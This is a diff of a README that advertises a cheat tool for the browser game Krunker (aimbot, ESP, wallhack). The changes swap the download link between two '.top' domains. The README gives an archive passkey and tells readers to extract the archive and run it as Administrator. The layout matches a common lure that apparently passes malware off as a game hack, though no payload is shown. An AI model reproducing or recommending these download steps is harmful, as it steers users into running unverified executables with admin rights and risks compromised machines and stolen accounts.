@@ -6,7 +6,7 @@ Krunker hack with aimbot, ESP, wallhack, and more. For educational purposes only
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -72,7 +72,7 @@ Based on popular mods like **KrunkerAim**, **KrunkerESP**, and **KrunkerMenu**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Krunker.
 4. Run the hack **as Administrator**.
